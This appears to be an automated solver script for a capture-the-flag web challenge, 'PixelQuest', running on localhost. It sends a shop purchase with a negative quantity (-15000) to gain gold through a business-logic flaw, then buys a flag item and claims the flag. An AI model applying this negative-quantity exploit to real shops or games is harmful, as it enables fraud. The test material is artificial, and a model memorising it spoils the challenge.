#!/usr/bin/env python3
"""
Automated Exploit Solver for Challenge 4: PixelQuest (Gamified Web)
Vulnerability: Negative Item Quantity / Integer Underflow Business Logic Flaw
"""
import requests
import re
import sys

BASE_URL = "http://localhost:8004"

def solve():
    print("[*] Testing Challenge 4: PixelQuest Game Logic Exploit...")
    session = requests.Session()

    # Step 1: Initial state check
    r_state = session.get(f"{BASE_URL}/api/state")
    player = r_state.json().get("player", {})
    print(f"[+] Initial Gold: {player.get('gold')} G")

    # Step 2: Exploit negative quantity in shop purchase
    # Buying -15000 Steel Longswords (Price 100) -> total_cost = -1,500,000
    # player.gold -= (-1,500,000) -> adds 1,500,000 Gold!
    print("[*] Sending malicious shop payload (quantity = -15000)...")
    r_buy_neg = session.post(f"{BASE_URL}/api/shop/buy", json={
        "item_id": "iron_sword",
        "quantity": -15000
    })
    
    updated_player = r_buy_neg.json().get("player", {})
    gold = updated_player.get("gold", 0)
    print(f"[+] Gold after underflow exploit: {gold} G")

    if gold < 1000000:
        print("[-] Gold exploit did not reach 1,000,000 G.")
        sys.exit(1)

    # Step 3: Legitimate purchase of the Ancient Crown of Root (1,000,000 G)
    print("[*] Purchasing Ancient Crown of Root (mythic_root_flag)...")
    r_buy_crown = session.post(f"{BASE_URL}/api/shop/buy", json={
        "item_id": "mythic_root_flag",
        "quantity": 1
    })
    print(f"[+] Crown purchase response: {r_buy_crown.json().get('message')}")

    # Step 4: Claim the King's Flag
    print("[*] Requesting flag from the Royal Enclave...")
    r_claim = session.post(f"{BASE_URL}/api/shop/claim-flag")
    data = r_claim.json()

    flag = data.get("flag")
    if flag and "CTF{" in flag:
        print(f"\n[SUCCESS] Extracted Flag: {flag}")
        return flag
    else:
        print(f"[-] Failed to extract flag: {data}")
        sys.exit(1)

if __name__ == "__main__":
    solve()
